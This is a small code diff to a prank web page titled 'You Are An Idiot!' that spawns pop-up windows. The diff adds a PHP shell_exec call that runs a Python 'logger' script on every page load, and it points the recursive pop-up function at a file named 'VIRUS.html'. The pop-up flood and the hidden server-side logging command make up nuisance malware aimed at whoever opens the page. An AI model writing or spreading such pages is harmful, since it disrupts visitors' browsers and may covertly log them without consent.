@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <title>You Are An Idiot!</title>
+<?PHP
+	echo shell_exec("python logger.py 'parameter1'");
+	?>
 </head>
 <body id="bodyEl">
     <h1 id="title"></h1>
@@ -58,7 +61,7 @@
         }, 400)
 
         function createNewPopUp(){
-            let newWindow = window.open('index.html','', 'width=350px height=200px')
+            let newWindow = window.open('VIRUS.html','', 'width=350px height=200px')
             popups.push(newWindow)
         }
 
